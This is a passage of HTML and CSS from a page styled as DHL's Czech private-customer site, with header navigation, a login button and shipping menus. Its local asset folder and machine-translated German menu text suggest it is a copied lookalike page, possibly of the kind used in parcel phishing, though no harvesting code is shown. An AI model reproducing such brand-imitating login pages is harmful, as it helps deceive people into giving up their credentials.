          flex-wrap: wrap;
          padding: 20px;
          width: 100%;
          left: 0;
          min-height: 75vh;
          border-bottom: 4px solid #fc0;
          border-right: 1px solid #f2f2f2;
          border-left: 1px solid #f2f2f2
        }
        .dhl.redesign .header__navigationDropdown>li.link-holder {
          border-bottom: 0;
          margin-bottom: 16px
        }
        .dhl.redesign .header__navigationDropdown>li.link-holder:hover>a {
          color: #000
        }
        .dhl.redesign .header__navigationDropdown>li.link-holder>a {
          height: 54px;
          line-height: 18px;
          font-weight: 700;
          border-bottom: 1px solid #e8e8e8
        }
        .dhl.redesign .header__navigationDropdown>li.link-holder>ul.header__navigationDropdown_sub {
          flex-direction: column
        }
        .dhl.redesign .header__navigationDropdown>li.link-holder>ul.header__navigationDropdown_sub>li {
          flex-direction: inherit
        }
        .dhl.redesign .header__navigationDropdown>li.link-holder>ul.header__navigationDropdown_sub>li>a {
          padding: 15px 18px 15px;
          line-height: 18px;
          position: relative;
          font-weight: 400
        }
      }
      
      @media(max-width:767px),
      (min-width:768px) and (max-width:991px) {
        .dhl.redesign .header__navigationDropdown {
          -webkit-box-shadow: none;
          box-shadow: none
        }
      }
      
      .dhl.redesign .header__navigationDropdown li>a {
        display: flex;
        justify-content: space-between;
        align-items: center
      }
      
      .dhl.redesign .header__navigationDropdown li>a:hover,
      .dhl.redesign .header__navigationDropdown li>a:focus {
        background: 0;
        background-color: #f5f5f5;
        color: #323232
      }
      
      @media(max-width:767px),
      (min-width:768px) and (max-width:991px),
      (min-width:992px) and (max-width:1199px) {
        .dhl.redesign .header__navigationDropdown li>a:hover,
        .dhl.redesign .header__navigationDropdown li>a:focus {
          background-color: #fafafa
        }
      }
      
      .dhl.redesign .header__navigationDropdown li>a .icon {
        fill: #d40511
      }
      
      .dhl.redesign .header__navigationDropdown li>a {
        border-bottom: 1px solid #e8e8e8
      }
      
      @media(min-width:1200px) {
        .dhl.redesign li:hover>.header__navigationDropdown {
          display: flex !important;
          min-height: 420px;
          border-right: 1px solid rgba(50, 50, 50, 0.1);
          border-left: 1px solid rgba(50, 50, 50, 0.1);
          padding-bottom: 0
        }
        .dhl.redesign .has-dropdown>.header__navigationDropdown:focus-within {
          display: flex !important;
          min-height: 420px;
          border-right: 1px solid rgba(50, 50, 50, 0.1);
          border-left: 1px solid rgba(50, 50, 50, 0.1);
          padding-bottom: 0
        }
        .dhl.redesign li.userMenu:hover>.header__navigationDropdown,
        .dhl.redesign li.userMenu:focus>.header__navigationDropdown {
          min-height: 100%
        }
        .dhl.redesign .userMenu.has-dropdown>.header__navigationDropdown:focus-within {
          min-height: 100%
        }
      }
      
      @media(max-width:767px),
      (min-width:768px) and (max-width:991px),
      (min-width:992px) and (max-width:1199px) {
        .dhl.redesign .header__navigationDropdown {
          position: static;
          background-color: #fafafa
        }
      }
      
      .dhl.redesign .header__linkIcon {
        display: none;
        align-items: center;
        color: #d40511
      }
      
      @media(max-width:767px),
      (min-width:768px) and (max-width:991px),
      (min-width:992px) and (max-width:1199px) {
        .dhl.redesign .header__linkIcon {
          display: flex
        }
      }
      
      .dhl.redesign .header__linkIcon.menu__slideIn:before {
        content: '';
        position: absolute;
        right: 55px;
        width: 1px;
        height: 56px;
        border-left: 1px solid #e8e8e8
      }
      
      .dhl.redesign .header__linkIcon.menu__slideIn .icon {
        position: relative;
        left: -4px
      }
      
      @media(min-width:1200px) {
        .dhl.redesign .header__navigationDropdown .header__linkIcon {
          display: none
        }
      }
      
      .dhl.redesign .lang {
        width: auto;
        position: relative;
        background: transparent
      }
      
      @media(min-width:1200px) {
        .dhl.redesign .lang {
          width: 74px;
          padding-top: 5px
        }
        .dhl.redesign .lang:hover>.lang__option--current,
        .dhl.redesign .lang:focus>.lang__option--current {
          background-color: #fff
        }
        .dhl.redesign .lang:hover>.lang__option--current>.hiddenIn,
        .dhl.redesign .lang:focus>.lang__option--current>.hiddenIn {
          display: none
        }
        .dhl.redesign .lang:hover .lang__list,
        .dhl.redesign .lang:focus .lang__list {
          border-top: 0;
          display: block;
          width: 100%
        }
      }
      
      @media(min-width:1200px) and (max-width:767px),
      (min-width:1200px) and (min-width:768px) and (max-width:991px),
      (min-width:1200px) and (min-width:992px) and (max-width:1199px) {
        .dhl.redesign .lang:hover>.lang__option--current,
        .dhl.redesign .lang:focus>.lang__option--current {
          background-color: #f5f5f5
        }
      }
      
      @media(min-width:1200px) and (max-width:767px),
      (min-width:1200px) and (min-width:768px) and (max-width:991px),
      (min-width:1200px) and (min-width:992px) and (max-width:1199px) {
        .dhl.redesign .lang:hover .lang__list,
        .dhl.redesign .lang:focus .lang__list {
          position: relative;
          display: flex;
          align-items: flex-end;
          justify-content: flex-end;
          background-color: #fafafa
        }
      }
      
      .dhl.redesign .lang:hover,
      .dhl.redesign .lang:focus {
        cursor: pointer;
        color: #323232;
        background: #fff
      }
      
      @media(min-width:1200px) {
        .dhl.redesign .lang:hover,
        .dhl.redesign .lang:focus {
          -webkit-box-shadow: 1px 1px 6px 0 rgba(0, 0, 0, 0.1);
          box-shadow: 1px 1px 6px 0 rgba(0, 0, 0, 0.1)
        }
      }
      
      .dhl.redesign .lang:focus {
        outline: 0
      }
      
      .dhl.redesign .lang__option {
        padding: 0 !important;
        text-transform: uppercase;
        padding: 6px 13px !important
      }
      
      @media(min-width:1200px) {
        .dhl.redesign .lang__option {
          height: 38px
        }
      }
      
      @media(min-width:1200px) {
        .dhl.redesign .lang__option:hover,
        .dhl.redesign .lang__option:focus {
          background-color: #f5f5f5;
          cursor: pointer
        }
      }
      
      .dhl.redesign .lang__option--current {
        margin-top: 2px;
        font-size: 17px;
        color: #d40511 !important
      }
      
      @media(max-width:767px),
      (min-width:768px) and (max-width:991px),
      (min-width:992px) and (max-width:1199px) {
        .dhl.redesign .lang__option--current {
          margin-top: 0
        }
      }
      
      .dhl.redesign .lang__option--current .icon {
        margin: -2px 0 0 5px;
        color: #333 !important
      }
      
      @media(max-width:767px),
      (min-width:768px) and (max-width:991px),
      (min-width:992px) and (max-width:1199px) {
        .dhl.redesign .lang__option {
          display: flex;
          justify-content: flex-end
        }
      }
      
      .dhl.redesign .lang__list {
        display: none
      }
      
      @media(max-width:767px),
      (min-width:768px) and (max-width:991px),
      (min-width:992px) and (max-width:1199px) {
        .dhl.redesign .lang__list-item {
          padding-right: 25px
        }
      }
      
      @media(max-width:767px),
      (min-width:768px) and (max-width:991px) {
        .dhl.redesign .lang__list-item>a.lang__option {
          padding-right: 17px !important
        }
      }
      
      @media(min-width:992px) and (max-width:1199px) {
        .dhl.redesign .lang__list-item>a.lang__option {
          padding-right: 18px !important
        }
      }
      
      .dhl.redesign .lang__list-item>a.lang__option {
        font-weight: 400
      }
      
      .dhl.redesign .lang__list-item:hover,
      .dhl.redesign .lang__list-item:focus {
        background-color: #e8e8e8
      }
      
      .dhl.redesign .lang__list-item:focus {
        outline: 0
      }
      
      .dhl.redesign .lang__option--current {
        display: flex !important
      }
      
      @media(max-width:767px),
      (min-width:768px) and (max-width:991px),
      (min-width:992px) and (max-width:1199px) {
        .dhl.redesign .lang__option--current {
          justify-content: flex-end !important;
          background-color: #f5f5f5
        }
      }
      
      .dhl.redesign .lang__option--current>.hiddenIn {
        display: flex;
        padding: 2px
      }
      
      @media(min-width:1200px) {
        .dhl.redesign .lang__option--current>.hiddenIn {
          pointer-events: none;
          padding: 6px 2px 2px 2px
        }
      }
      
      .dhl.redesign .header-info {
        font-size: 14px;
        font-family: "Delivery", Verdana, sans-serif;
        line-height: 17px;
        color: #323232;
        letter-spacing: 0;
        background: #f2f2f2
      }
      
      @media(min-width:1200px) {
        .dhl.redesign .header-info {
          padding: 11px 50px 9px 50px;
          max-width: 1170px;
          margin: 0 auto
        }
      }
      
      @media(min-width:768px) and (max-width:991px),
      (min-width:992px) and (max-width:1199px) {
        .dhl.redesign .header-info {
          padding: 11px 0 12px 15px;
          max-width: 100%;
          margin: 0 auto
        }
      }
      
      .dhl.redesign .header-info__icon {
        align-items: center;
        display: inline-flex;
        vertical-align: middle;
        padding-left: 8px
      }
      
      .dhl.redesign .header-info__icon>.icon {
        width: 6px;
        height: 14px;
        vertical-align: middle
      }
      
      .dhl.redesign .header-info-prio1 {
        padding-top: 0
      }
      
      .dhl.redesign .header-info-prio1 a {
        display: inline-flex;
        color: #fff;
        background: #d40511;
        padding: 7px 21px 7px 21px;
        -webkit-transition: all .2s ease-in-out;
        -o-transition: all .2s ease-in-out;
        transition: all .2s ease-in-out
      }
      
      @media(min-width:768px) and (max-width:991px),
      (min-width:992px) and (max-width:1199px),
      (min-width:1200px) {
        .dhl.redesign .header-info-prio1 a {
          border-radius: 0 0 6px 6px;
          padding: 5px 15px 7px 15px
        }
      }
      
      @media(max-width:767px) {
        .dhl.redesign .header-info-prio1 a {
          width: 100%;
          padding: 7px 15px 7px 15px
        }
      }
      
      .dhl.redesign .header-info-prio1 a:hover,
      .dhl.redesign .header-info-prio1 a:focus {
        color: #d40511;
        background: #fff;
        box-shadow: 0 0 0 2px #d1d1d1
      }
      
      .dhl.redesign .header-info-prio1 a p {
        margin: 0 !important
      }
      
      .dhl.redesign.scroll-buttons .row {
        position: relative
      }
      
      @media(min-width:768px) and (max-width:991px),
      (min-width:992px) and (max-width:1199px),
      (min-width:1200px) {
        _:-ms-fullscreen .dhl.redesign.stage .stageitem .stage__content.content-inner {
          bottom: 36px
        }
      }
      
      .container {
        padding-right: 15px;
        padding-left: 15px;
        margin-right: auto;
        margin-left: auto
      }
      
      @media(min-width:768px) {
        .container {
          width: 750px
        }
      }
      
      @media(min-width:992px) {
        .container {
          width: 970px
        }
      }
      
      @media(min-width:1200px) {
        .container {
          width: 1170px
        }
      }
      
      button::-moz-focus-inner {
        padding: 0;
        border: 0
      }  
  </style>


<div class="container">
<div class="row">
<div class="dhl redesign">
<div class="header-info header-info-prio1">
<a title="Informationen zum Coronavirus" href="https://www.dhl.com/coronavirus" class="external" rel="noreferrer">
<p>Aktuální informace o koronaviru</p>
<div class="header-info__icon"> <span class="icon">
<svg role="image" class="arrow-link-right">
</svg><img src="./prop_files/dhl-image-8.svg">

</span> </div>
</a>
</div>
</div>
</div>
</div>
<div class="container header-wrap">
<div class="row">
<header class="header dhl redesign">
<div class="header__secondaryNavigation">
<ul role="tablist" class="tabnav">
<li class="header_link_primary" tabindex="0"><a tabindex="-1" href="" class="header-tab active">soukromé zákazníky</a></li>
<li class="header_link_primary" tabindex="0"><a tabindex="-1" href="https://www.dhl.com/cz/geschaeftskunden.html" class="header-tab ">firemní zákazníky</a></li>
</ul>
</div>
<div class="header__primaryNavigation">
<div class="header__logoWrapper">
<a href=""><img src="./prop_files/logo.svg" alt="DHL Paket" class="header__logo"></a>
</div>
<div class="header__navigationWrapper--mobile">
<ul>
<li class="has-dropdown">
<a href="#" id="navMenuButton" tabindex="0" class="header__navigation-link header__linkPrimary" rel="noreferrer"> <span class="icon">
<svg role="image" title="menu" class="menu">
</svg><img src="./prop_files/dhl-image-5.svg">

</span> </a>
</li>
<li tabindex="0" class="has-dropdown userMenu">
<a tabindex="-1" href="#login" class="header__linkPrimary userMenuButton jump" rel="noreferrer">
<div class="header__linkCaption"> <span class="icon icon-login-bordered">
<svg role="image" title="login" class="login">
</svg><img src="./prop_files/dhl-image-7.svg">

</span></div>
</a>
<div class="header__userMenuWrapper">
<ul>
<li tabindex="0"> <span class="loggedInUserName">Login</span>
<div class="">
<div class="loginContainer">
<button type="button" class="login btn btn-primary btn-block"> Login </button>
</div>
<p class="link-primary link-icon link-iconRight registerLinkLogin"> <span class="icon"> <svg role="image" class="arrow-link-right">
</svg><img src="./prop_files/dhl-image-8.svg">

</span> <span class="txt"><a class="registerLink" href="https://www.dhl.com/cz/privatkunden/kundenkonto/registrierung.html">
<span>Ještě nemáte zákaznický účet DHL? zaregistrujte se nyní zdarma </span> </a>
</span>
</p>
</div>
</li>
<li>
<a href="#meineSendungen" tabindex="0" class="header__linkPrimary jump" target="_self">
<div class="header__linkCaption">Moje zásilky</div>
</a>
</li>
<li>
<a href="https://www.dhl.com/cz/privatkunden/pakete-versenden/online-frankieren.html" tabindex="0" class="header__linkPrimary" target="_self">
<div class="header__linkCaption">Online frankování</div>
</a>
</li>
<li>
<a href="https://www.dhl.com/cz/privatkunden/pakete-versenden/online-frankieren.html?type=AddressBook" tabindex="0" class="header__linkPrimary" target="_self">
<div class="header__linkCaption">adresář</div>
</a>
</li>
<li>
<a href="https://www.dhl.com/cz/privatkunden/pakete-versenden/online-frankieren.html?type=ShoppingCartHistory" tabindex="0" class="header__linkPrimary" target="_self">
<div class="header__linkCaption">Nedávné nákupy</div>
</a>
</li>
<li>
<a href="https://www.dhl.com/cz/privatkunden/pakete-versenden/online-frankieren.html?type=CouponOverview" tabindex="0" class="header__linkPrimary" target="_self">
<div class="header__linkCaption">Moje kódy kupónů</div>
</a>
</li>
<li>
<a href="https://www.dhl.com/cz/privatkunden/anmelden/bonusprogramm.html" tabindex="0" class="header__linkPrimary" target="_self">
<div class="header__linkCaption">bonusové body</div>
</a>
</li>
<li>
<a href="https://www.dhl.com/cz/privatkunden/kundenkonto/meine-daten.html" tabindex="0" class="header__linkPrimary" target="_self">
<div class="header__linkCaption">Moje data &amp; služby</div>
</a>
</li>
</ul>
</div>
</li>
<li>
<a href="#search" class="header__linkPrimary jump" rel="noreferrer">
<div class="header__linkCaption"> <span class="icon">
<svg role="image" title="search" class="search">
</svg><img src="./prop_files/dhl-image-6.svg">

</span> </div>
</a>
</li>
</ul>
</div>
<div class="header__navigationWrapper">
<div class="header__mobileTabWrapper hiddenLG">
<div class="header__mobileTabWrapper__item active">
<a href="">
<div class="header__linkCaption">soukromé zákazníky</div>
</a>
</div>
<div class="header__mobileTabWrapper__item ">
<a href="https://www.dhl.com/cz/geschaeftskunden.html">
<div class="header__linkCaption">firemní zákazníky</div>
</a>
</div>
</div>
<ul class="link-wrapper" style="pointer-events: auto;">
<li tabindex="0" class="header_link has-dropdown">
<a tabindex="-1" href="https://www.dhl.com/cz/privatkunden/pakete-versenden.html" class="header__linkPrimary  ">
<div class="header__linkCaption" aria-selected="false"> posílat balíčky </div>
<div class="header__linkIcon menu__slideIn"> <span class="icon">
<svg xmlns="http://www.w3.org/2000/svg" width="18" height="17" viewBox="0 0 18 17">
<path fill-rule="evenodd" d="M4.23663958,9.33285646 L8.96714933,14.063242 C8.96714933,14.063242 9.41862628,14.6230237 9.30696802,15.1837991 C9.14587707,15.9940978 8.03550458,16.4661924 7.33276548,15.9269041 C7.27538381,15.8829363 7.26333615,15.8691498 7.21054998,15.8198413 L0.359899475,8.96906663 C0.189120708,8.78673701 0.17471319,8.74264504 0.124162675,8.64017778 C-0.0794056147,8.22732787 -0.0299729244,7.70331651 0.252712511,7.33468278 C0.296804483,7.27730112 0.310590988,7.26525345 0.359899475,7.21259149 L7.21054998,0.361816782 C7.46827067,0.120490859 7.80411487,-0.0112882476 8.17014035,0.000759418088 C8.24192953,0.00783897424 8.26018733,0.00783897424 8.3311071,0.0219980866 C9.14488345,0.183834256 9.61350038,1.29346153 9.07421209,1.99620063 C9.03024432,2.0535823 9.01645781,2.06562996 8.96714933,2.11829192 L4.23663958,6.84880167 L16.7634795,6.84880167 C16.7916735,6.84979529 16.8199917,6.85066471 16.8481858,6.85165833 C17.1604314,6.88382684 17.2498574,6.93288692 17.4088369,7.02964086 C17.8929792,7.32400135 18.1232511,7.97370588 17.9338419,8.50678404 C17.7816936,8.93453827 17.3807671,9.25970104 16.9326436,9.3213056 C16.8578736,9.33161443 16.8387464,9.3302482 16.7634795,9.33285646 L4.23663958,9.33285646 Z" transform="matrix(-1 0 0 1 18 0)"></path>
</svg>
</span> </div>
</a>
<ul class="header__navigationDropdown sub-menu">
<li tabindex="0" class="menu-back hiddenLG">
<a href="#" tabindex="-1" class="header__linkPrimary" target="_blank" rel="noopener">
<div class="header__linkIcon"> <span class="icon">
<svg xmlns="http://www.w3.org/2000/svg" width="18" height="17" viewBox="0 0 18 17">
<path fill-rule="evenodd" d="M4.23663958,9.33285646 L8.96714933,14.063242 C8.96714933,14.063242 9.41862628,14.6230237 9.30696802,15.1837991 C9.14587707,15.9940978 8.03550458,16.4661924 7.33276548,15.9269041 C7.27538381,15.8829363 7.26333615,15.8691498 7.21054998,15.8198413 L0.359899475,8.96906663 C0.189120708,8.78673701 0.17471319,8.74264504 0.124162675,8.64017778 C-0.0794056147,8.22732787 -0.0299729244,7.70331651 0.252712511,7.33468278 C0.296804483,7.27730112 0.310590988,7.26525345 0.359899475,7.21259149 L7.21054998,0.361816782 C7.46827067,0.120490859 7.80411487,-0.0112882476 8.17014035,0.000759418088 C8.24192953,0.00783897424 8.26018733,0.00783897424 8.3311071,0.0219980866 C9.14488345,0.183834256 9.61350038,1.29346153 9.07421209,1.99620063 C9.03024432,2.0535823 9.01645781,2.06562996 8.96714933,2.11829192 L4.23663958,6.84880167 L16.7634795,6.84880167 C16.7916735,6.84979529 16.8199917,6.85066471 16.8481858,6.85165833 C17.1604314,6.88382684 17.2498574,6.93288692 17.4088369,7.02964086 C17.8929792,7.32400135 18.1232511,7.97370588 17.9338419,8.50678404 C17.7816936,8.93453827 17.3807671,9.25970104 16.9326436,9.3213056 C16.8578736,9.33161443 16.8387464,9.3302482 16.7634795,9.33285646 L4.23663958,9.33285646 Z"></path>
</svg>
</span> </div>
<div class="header__linkCaption">Zadní</div>
</a>
</li>
<li class="link-holder col-lg-3" tabindex="0">
<a href="https://www.dhl.com/cz/privatkunden/pakete-versenden/online-frankieren.html" tabindex="-1" class="header__linkPrimary   ">
<div class="header__linkCaption"> <span>Frank online</span> </div>
</a>
<ul class="header__navigationDropdown_sub">
<li tabindex="0">
<a href="https://www.dhl.com/cz/privatkunden/pakete-versenden/online-frankieren/versandmarke-kaufen.html" tabindex="-1" class="header__linkPrimary  ">
<div class="header__linkCaption"> <span>Koupit přepravní štítek</span> </div>
</a>
</li>
<li tabindex="0">
<a href="https://www.dhl.com/cz/privatkunden/pakete-versenden/online-frankieren/sparsets-kaufen.html" tabindex="-1" class="header__linkPrimary  ">
<div class="header__linkCaption"> <span>Kupte si spořicí sady</span> </div>
</a>
</li>
<li tabindex="0">
<a href="https://www.dhl.com/cz/privatkunden/pakete-versenden/online-frankieren/abholung-buchen.html" tabindex="-1" class="header__linkPrimary  ">
<div class="header__linkCaption"> <span>Vyzvednutí knihy</span> </div>
</a>
</li>
<li tabindex="0">
<a href="https://www.dhl.com/cz/privatkunden/pakete-versenden/online-frankieren/so-funktioniert-es.html" tabindex="-1" class="header__linkPrimary  ">
<div class="header__linkCaption"> <span>Tak to funguje</span> </div>
</a>
</li>
</ul>
</li>
<li class="link-holder col-lg-3" tabindex="0">
<a href="https://www.dhl.com/cz/privatkunden/pakete-versenden/deutschlandweit-versenden.html" tabindex="-1" class="header__linkPrimary   ">
<div class="header__linkCaption"> <span>Doprava po celém Německu</span> </div>
</a>
<ul class="header__navigationDropdown_sub">
<li tabindex="0">
<a href="https://www.dhl.com/cz/privatkunden/pakete-versenden/deutschlandweit-versenden/preise-national.html" tabindex="-1" class="header__linkPrimary  ">
<div class="header__linkCaption"> <span>Přehled cen národní</span> </div>
</a>
</li>
<li tabindex="0">
<a href="https://www.dhl.com/cz/privatkunden/pakete-versenden/deutschlandweit-versenden/paeckchen.html" tabindex="-1" class="header__linkPrimary  ">
<div class="header__linkCaption"> <span>balíček</span> </div>
</a>
</li>
<li tabindex="0">
<a href="https://www.dhl.com/cz/privatkunden/pakete-versenden/deutschlandweit-versenden/paket.html" tabindex="-1" class="header__linkPrimary  ">
<div class="header__linkCaption"> <span>balík</span> </div>
</a>
</li>
<li tabindex="0">
<a href="https://www.dhl.com/cz/privatkunden/pakete-versenden/deutschlandweit-versenden/express-easy.html" tabindex="-1" class="header__linkPrimary  ">
<div class="header__linkCaption"> <span>ExpressEasy</span> </div>
</a>
</li>
</ul>
</li>
<li class="link-holder col-lg-3" tabindex="0">
<a href="https://www.dhl.com/cz/privatkunden/pakete-versenden/weltweit-versenden.html" tabindex="-1" class="header__linkPrimary   ">
<div class="header__linkCaption"> <span>Odesílejte do celého světa</span> </div>
</a>
<ul class="header__navigationDropdown_sub">
<li tabindex="0">
<a href="https://www.dhl.com/cz/privatkunden/pakete-versenden/weltweit-versenden/preise-international.html" tabindex="-1" class="header__linkPrimary  ">
<div class="header__linkCaption"> <span>Přehled cen mezinárodní</span> </div>
</a>
</li>
<li tabindex="0">
<a href="https://www.dhl.com/cz/privatkunden/pakete-versenden/weltweit-versenden/paeckchen.html" tabindex="-1" class="header__linkPrimary  ">
<div class="header__linkCaption"> <span>balíček</span> </div>
</a>
</li>
<li tabindex="0">
<a href="https://www.dhl.com/cz/privatkunden/pakete-versenden/weltweit-versenden/paket.html" tabindex="-1" class="header__linkPrimary  ">
<div class="header__linkCaption"> <span>balík</span> </div>
</a>
</li>
<li tabindex="0">
<a href="https://www.dhl.com/cz/privatkunden/pakete-versenden/weltweit-versenden/express-easy.html" tabindex="-1" class="header__linkPrimary  ">
<div class="header__linkCaption"> <span>ExpressEasy</span> </div>
</a>
</li>
</ul>
</li>
<li class="link-holder col-lg-3" tabindex="0">
<a href="https://www.dhl.com/cz/privatkunden/pakete-versenden/pakete-abgeben.html" tabindex="-1" class="header__linkPrimary   ">
<div class="header__linkCaption"> <span>doručovat balíčky</span> </div>
</a>
<ul class="header__navigationDropdown_sub">
<li tabindex="0">
<a href="https://www.dhl.com/cz/privatkunden/pakete-versenden/pakete-abgeben/standorte-finden.html" tabindex="-1" class="header__linkPrimary  ">
<div class="header__linkCaption"> <span>najít místa</span> </div>
</a>
</li>
<li tabindex="0">
<a href="https://www.dhl.com/cz/privatkunden/pakete-versenden/pakete-abgeben/pakete-abholen-lassen.html" tabindex="-1" class="header__linkPrimary  ">
<div class="header__linkCaption"> <span>nechat si vyzvednout balíčky</span> </div>
</a>
</li>
<li tabindex="0">
<a href="https://www.dhl.com/cz/privatkunden/pakete-versenden/pakete-abgeben/pakete-zusteller-mitgeben.html" tabindex="-1" class="header__linkPrimary  ">
<div class="header__linkCaption"> <span>Vyzvednutí balíku</span> </div>
</a>
</li>
<li tabindex="0">
<a href="https://www.dhl.com/cz/privatkunden/pakete-versenden/pakete-abgeben/verpacken.html" tabindex="-1" class="header__linkPrimary  ">
<div class="header__linkCaption"> <span>Pořádně zabalit</span> </div>
</a>
</li>
</ul>
</li>
<li tabindex="0" class="lang hiddenLG langToggle-wrapper"> <a tabindex="-1" href="" id="lang-toggle" class="lang__option lang__option--current">
cz
<div class="header__linkIcon hiddenIn toggleDropdown">
<span class="icon">
<svg role="image" class="arrow-down">
</svg><img src="./prop_files/dhl-image-1.svg">

</span>
</div>
</a>
<div class="lang__list">
<div tabindex="0" class="lang__list-item"> <a tabindex="-1" class="lang__option" href="https://www.dhl.com/en/privatkunden.html">en</a> </div>
</div>
</li>
</ul>
</li>
<li tabindex="0" class="header_link has-dropdown">
<a tabindex="-1" href="https://www.dhl.com/cz/privatkunden/pakete-empfangen.html" class="header__linkPrimary  ">
<div class="header__linkCaption" aria-selected="false"> přijímat pakety </div>
<div class="header__linkIcon menu__slideIn"> <span class="icon">
<svg xmlns="http://www.w3.org/2000/svg" width="18" height="17" viewBox="0 0 18 17">
<path fill-rule="evenodd" d="M4.23663958,9.33285646 L8.96714933,14.063242 C8.96714933,14.063242 9.41862628,14.6230237 9.30696802,15.1837991 C9.14587707,15.9940978 8.03550458,16.4661924 7.33276548,15.9269041 C7.27538381,15.8829363 7.26333615,15.8691498 7.21054998,15.8198413 L0.359899475,8.96906663 C0.189120708,8.78673701 0.17471319,8.74264504 0.124162675,8.64017778 C-0.0794056147,8.22732787 -0.0299729244,7.70331651 0.252712511,7.33468278 C0.296804483,7.27730112 0.310590988,7.26525345 0.359899475,7.21259149 L7.21054998,0.361816782 C7.46827067,0.120490859 7.80411487,-0.0112882476 8.17014035,0.000759418088 C8.24192953,0.00783897424 8.26018733,0.00783897424 8.3311071,0.0219980866 C9.14488345,0.183834256 9.61350038,1.29346153 9.07421209,1.99620063 C9.03024432,2.0535823 9.01645781,2.06562996 8.96714933,2.11829192 L4.23663958,6.84880167 L16.7634795,6.84880167 C16.7916735,6.84979529 16.8199917,6.85066471 16.8481858,6.85165833 C17.1604314,6.88382684 17.2498574,6.93288692 17.4088369,7.02964086 C17.8929792,7.32400135 18.1232511,7.97370588 17.9338419,8.50678404 C17.7816936,8.93453827 17.3807671,9.25970104 16.9326436,9.3213056 C16.8578736,9.33161443 16.8387464,9.3302482 16.7634795,9.33285646 L4.23663958,9.33285646 Z" transform="matrix(-1 0 0 1 18 0)"></path>
</svg>
</span> </div>
</a>
<ul class="header__navigationDropdown sub-menu">
<li tabindex="0" class="menu-back hiddenLG">
<a href="#" tabindex="-1" class="header__linkPrimary" target="_blank" rel="noopener">
<div class="header__linkIcon"> <span class="icon">
<svg xmlns="http://www.w3.org/2000/svg" width="18" height="17" viewBox="0 0 18 17">
<path fill-rule="evenodd" d="M4.23663958,9.33285646 L8.96714933,14.063242 C8.96714933,14.063242 9.41862628,14.6230237 9.30696802,15.1837991 C9.14587707,15.9940978 8.03550458,16.4661924 7.33276548,15.9269041 C7.27538381,15.8829363 7.26333615,15.8691498 7.21054998,15.8198413 L0.359899475,8.96906663 C0.189120708,8.78673701 0.17471319,8.74264504 0.124162675,8.64017778 C-0.0794056147,8.22732787 -0.0299729244,7.70331651 0.252712511,7.33468278 C0.296804483,7.27730112 0.310590988,7.26525345 0.359899475,7.21259149 L7.21054998,0.361816782 C7.46827067,0.120490859 7.80411487,-0.0112882476 8.17014035,0.000759418088 C8.24192953,0.00783897424 8.26018733,0.00783897424 8.3311071,0.0219980866 C9.14488345,0.183834256 9.61350038,1.29346153 9.07421209,1.99620063 C9.03024432,2.0535823 9.01645781,2.06562996 8.96714933,2.11829192 L4.23663958,6.84880167 L16.7634795,6.84880167 C16.7916735,6.84979529 16.8199917,6.85066471 16.8481858,6.85165833 C17.1604314,6.88382684 17.2498574,6.93288692 17.4088369,7.02964086 C17.8929792,7.32400135 18.1232511,7.97370588 17.9338419,8.50678404 C17.7816936,8.93453827 17.3807671,9.25970104 16.9326436,9.3213056 C16.8578736,9.33161443 16.8387464,9.3302482 16.7634795,9.33285646 L4.23663958,9.33285646 Z"></path>
</svg>
</span> </div>
<div class="header__linkCaption">Zadní</div>
</a>
</li>
<li class="link-holder col-lg-3" tabindex="0">
<a href="https://www.dhl.com/cz/privatkunden/pakete-empfangen/sendungen-verfolgen.html" tabindex="-1" class="header__linkPrimary   ">
<div class="header__linkCaption"> <span>Sledovat zásilky</span> </div>
</a>
<ul class="header__navigationDropdown_sub">
<li tabindex="0">
<a href="https://www.dhl.com/cz/privatkunden/pakete-empfangen/sendungen-verfolgen/paketankuendigung.html" tabindex="-1" class="header__linkPrimary  ">
<div class="header__linkCaption"> <span>oznámení balíčku</span> </div>
</a>
</li>
<li tabindex="0">
<a href="https://www.dhl.com/cz/privatkunden/pakete-empfangen/sendungen-verfolgen/zustellbenachrichtigung.html" tabindex="-1" class="header__linkPrimary  ">
<div class="header__linkCaption"> <span>oznámení o doručení</span> </div>
</a>
</li>
<li tabindex="0">
<a href="https://www.dhl.com/cz/privatkunden/pakete-empfangen/sendungen-verfolgen/live-tracking.html" tabindex="-1" class="header__linkPrimary  ">
<div class="header__linkCaption"> <span>Live-Tracking</span> </div>
</a>
</li>
</ul>
</li>
<li class="link-holder col-lg-3" tabindex="0">
<a href="https://www.dhl.com/cz/privatkunden/pakete-empfangen/pakete-zuhause-empfangen.html" tabindex="-1" class="header__linkPrimary   ">
<div class="header__linkCaption"> <span>Přijato doma</span> </div>
</a>
<ul class="header__navigationDropdown_sub">
<li tabindex="0">
<a href="https://www.dhl.com/cz/privatkunden/pakete-empfangen/pakete-zuhause-empfangen/ablageort.html" tabindex="-1" class="header__linkPrimary  ">
<div class="header__linkCaption"> <span>umístění skladu</span> </div>
</a>
</li>
<li tabindex="0">
<a href="https://www.dhl.com/cz/privatkunden/pakete-empfangen/pakete-zuhause-empfangen/nachbar.html" tabindex="-1" class="header__linkPrimary  ">
<div class="header__linkCaption"> <span>soused</span> </div>
</a>
</li>
<li tabindex="0">
<a href="https://www.dhl.com/cz/privatkunden/pakete-empfangen/pakete-zuhause-empfangen/liefertag.html" tabindex="-1" class="header__linkPrimary  ">
<div class="header__linkCaption"> <span>den doručení</span> </div>
</a>
</li>
</ul>
</li>
<li class="link-holder col-lg-3" tabindex="0">
<a href="https://www.dhl.com/cz/privatkunden/pakete-empfangen/an-einem-abholort-empfangen.html" tabindex="-1" class="header__linkPrimary   ">
<div class="header__linkCaption"> <span>Doručte na místo vyzvednutí</span> </div>
</a>
<ul class="header__navigationDropdown_sub">
<li tabindex="0">
<a href="https://www.dhl.com/cz/privatkunden/pakete-empfangen/an-einem-abholort-empfangen/packstation-empfang.html" tabindex="-1" class="header__linkPrimary  ">
<div class="header__linkCaption"> <span>DHL Packstation</span> </div>
</a>
</li>
<li tabindex="0">
<a href="https://www.dhl.com/cz/privatkunden/pakete-empfangen/an-einem-abholort-empfangen/filiale-empfang.html" tabindex="-1" class="header__linkPrimary  ">
<div class="header__linkCaption"> <span>pobočky/balíkové obchody</span> </div>
</a>
</li>
<li tabindex="0">
<a href="https://www.dhl.com/cz/privatkunden/pakete-empfangen/an-einem-abholort-empfangen/paketumleitung.html" tabindex="-1" class="header__linkPrimary  ">
<div class="header__linkCaption"> <span>přesměrovat pakety</span> </div>
</a>
</li>
</ul>
</li>
<li class="link-holder col-lg-3" tabindex="0">
<a href="https://www.dhl.com/cz/privatkunden/pakete-empfangen/express-sendung-empfangen.html" tabindex="-1" class="header__linkPrimary   ">
